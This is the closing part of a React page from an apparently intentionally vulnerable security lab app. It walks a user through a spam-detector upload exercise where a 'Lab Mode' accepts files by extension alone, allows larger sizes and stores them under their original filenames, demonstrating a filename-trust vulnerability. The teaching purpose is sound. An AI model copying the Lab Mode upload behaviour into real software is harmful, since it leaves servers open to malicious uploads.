              Go to the <Link to="/spam-detector">Spam Detector</Link> and log in. In Secure Mode (Lab Mode OFF), try uploading a file that is not actually text/plain (you can create a file with a .txt extension but change its MIME type, or upload a file larger than 100KB). Notice that Secure Mode rejects files that don't meet strict validation requirements. Then toggle to Lab Mode (Lab Mode ON) and try uploading the same file. Notice that Lab Mode accepts files based only on the filename extension, allows larger files (up to 10MB), and stores them using the original filename in the uploads/ directory. Check the backend/uploads/ folder to see files stored with their original names, demonstrating the filename trust vulnerability.
            </p>
          </div>
        </div>
      </section>
    </div>
  );
}

export default Vulnerabilities;

